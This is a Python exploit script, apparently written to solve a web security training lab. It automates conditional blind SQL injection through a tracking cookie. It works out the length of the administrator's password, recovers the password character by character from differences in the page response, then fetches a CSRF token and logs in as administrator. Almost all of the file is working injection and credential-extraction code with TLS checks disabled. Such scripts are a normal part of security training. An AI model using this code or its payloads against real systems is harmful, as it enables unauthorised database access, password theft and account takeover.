import time
import argparse
import sys
import logging
import urllib3

import requests
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


PROXIES = {
    "http":"127.0.0.1:8080",
    "https":"127.0.0.1:8080"
}

HEADERS = {
    "X-Pwnfox-Color":"cyan"
}

log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}][{levelname}][{name}] {message}",
    style="{",
    datefmt="%H:%M:%S"
)

ascii = [] #94 chars
for i in range(33,127):
    ascii.append(chr(i))


def getPassLength(url,no_proxy,session:requests.sessions.Session,cookies)->int:

    orig_cookie = cookies["TrackingId"]

    i = 1
    while True:
        cookies["TrackingId"] = f"{cookies['TrackingId']}' AND LENGTH((SELECT password FROM users WHERE username='administrator')) = '{i}"
        resp = session.get(url,cookies=cookies)
        if "Welcome back!" in resp.text:
            cookies["TrackingId"] = orig_cookie
            return i
        i+=1
        cookies["TrackingId"] = orig_cookie

# we can either do binary search or BRUTE Force. I will do brute force for now

# Brute force will not work.

# def bruteForce(url,no_proxy,size):
#
#     password = []
#
#     session = requests.Session()
#
#     if not no_proxy:
#         session.proxies.update(PROXIES)
#
#     session.verify=False
#
#     session.headers.update(HEADERS)
#
#     r = session.get(url)
#
#     cookies = r.cookies.get_dict()
#
#     orig_cookie = cookies["TrackingId"]
#
#     for i in range(1,size+1):
#         for b in ascii:
#             cookies["TrackingId"] = f"{cookies['TrackingId']}' AND SUBSTR((SELECT Password FROM Users WHERE Username = 'administrator'), {i}, 1)  = '{b}"
#             resp = session.get(url,cookies=cookies)
#             print(cookies["TrackingId"])
#             if "Welcome back!" in resp.text:
#                 print(f"FOUND {i} LETTER: {b}")
#                 password.append(b)
#                 cookies["TrackingId"] = orig_cookie
#                 break
#             cookies["TrackingId"] = orig_cookie
#         i+=1
#
#     print("".join(password))
#

def special_char():
    # 33-47 or 58-64 or 91-96 or 123-126
    pass

def check_number(url,session:requests.sessions.Session,cookies,item):

    count = 0
    orig_cookie = cookies["TrackingId"]

    cookies["TrackingId"] = f"{cookies["TrackingId"]}' AND SUBSTR((SELECT password from users where username='administrator'),{item},1) <= '9"
    r = session.get(url,cookies=cookies)
    if "Welcome back!" in r.text:
        count+=1
    cookies["TrackingId"] = orig_cookie


    cookies["TrackingId"] = f"{cookies["TrackingId"]}' AND SUBSTR((SELECT password from users where username='administrator'),{item},1) >= '0"
    r = session.get(url,cookies=cookies)
    if "Welcome back!" in r.text:
        count+=1
    cookies["TrackingId"] = orig_cookie

    if count == 2:
        return True
    return False
    pass

def upper():
    # 65-90
    pass

def check_lower(url,session:requests.sessions.Session,cookies,item):

    count = 0
    orig_cookie = cookies["TrackingId"]

    cookies["TrackingId"] = f"{cookies["TrackingId"]}' AND SUBSTR((SELECT password from users where username='administrator'),{item},1) <= 'z"
    r = session.get(url,cookies=cookies)
    if "Welcome back!" in r.text:
        count+=1
    cookies["TrackingId"] = orig_cookie


    cookies["TrackingId"] = f"{cookies["TrackingId"]}' AND SUBSTR((SELECT password from users where username='administrator'),{item},1) >= 'a"
    r = session.get(url,cookies=cookies)
    if "Welcome back!" in r.text:
        count+=1
    cookies["TrackingId"] = orig_cookie

    if count == 2:
        return True
    return False



def extract_csrf(html):
    soup = BeautifulSoup(html, "html.parser")

    csrf_input = soup.find("input", attrs={"name": "csrf"})

    if not csrf_input:
        print("[!] CSRF input not found. Dumping HTML snippet:\n")
        print(html)
        exit(1)

    return csrf_input.get("value")

# check priority

# lower -> number -> upper -> special

def exploit(url,no_proxy):

    password = []

    session = requests.Session()

    if not no_proxy:
        session.proxies.update(PROXIES)

    session.verify=False

    session.headers.update(HEADERS)

    r = session.get(url)

    cookies = r.cookies.get_dict()

    size = getPassLength(url,no_proxy,session,cookies)
    log.info(f"[+] found password length: {size}")
    # log.info("brute forcing password now")
    # bruteForce(url,no_proxy,size)

    for i in range(1,size+1):
        if check_lower(url,session,cookies,i):
            # brute_force_lower for ith

            orig_cookie = cookies["TrackingId"]
            for b in ascii[64:90]:
                cookies["TrackingId"] = f"{cookies['TrackingId']}' AND SUBSTR((SELECT Password FROM Users WHERE Username = 'administrator'), {i}, 1)  = '{b}"
                resp = session.get(url,cookies=cookies)
                print(cookies["TrackingId"])
                if "Welcome back!" in resp.text:
                    print(f"FOUND {i} LETTER: {b}")
                    password.append(b)
                    cookies["TrackingId"] = orig_cookie
                    break
                cookies["TrackingId"] = orig_cookie



        elif check_number(url,session,cookies,i):
            # brute_force_number for ith

            orig_cookie = cookies["TrackingId"]
            for b in ascii[15:25]:
                cookies["TrackingId"] = f"{cookies['TrackingId']}' AND SUBSTR((SELECT Password FROM Users WHERE Username = 'administrator'), {i}, 1)  = '{b}"
                resp = session.get(url,cookies=cookies)
                print(cookies["TrackingId"])
                if "Welcome back!" in resp.text:
                    print(f"FOUND {i} LETTER: {b}")
                    password.append(b)
                    cookies["TrackingId"] = orig_cookie
                    break
                cookies["TrackingId"] = orig_cookie

        # just impleneting these two for now

    log.info(f"[+] found administrator password: {"".join(password)}")

    log.info("sending a GET request to recieve CSRF token")

    resp = session.get(url+"login")

    csrf = extract_csrf(resp.text)
    log.info(f"csrf token extracted: {csrf}")

    payload = {
        "csrf": csrf,
        "username":"administrator",
        "password": "".join(password)
    }

    log.info("sending login payload")

    resp = session.post(url+"login",data=payload,allow_redirects=False)

    if resp.status_code == 302:
        time.sleep(2)
        r = session.get(url+"my-account")

        if "Congratulations, you solved the lab!" in r.text:
            log.info("✅ successfully exploited conditional BLIND SQLI")
        else:
            log.info("probing again...")
            time.sleep(2)
            r = session.get(url)
            if "Congratulations, you solved the lab!" in r.text:
                log.info("✅ successfully exploited conditional BLIND SQLI")
            else:
                log.info("❌ bypass failed!")




def parse():
    parser = argparse.ArgumentParser()
    parser.add_argument("-n", "--no-proxy", help="to not use any proxy", default=False, action="store_true")
    parser.add_argument("url", help="vulnerable url")
    return parser.parse_args()

def normalize_url(url: str):
    if not url.endswith("/"):
        url = url + "/"
        return url
    return url

if __name__ == "__main__":
    args = parse()
    exploit(normalize_url(args.url),args.no_proxy)



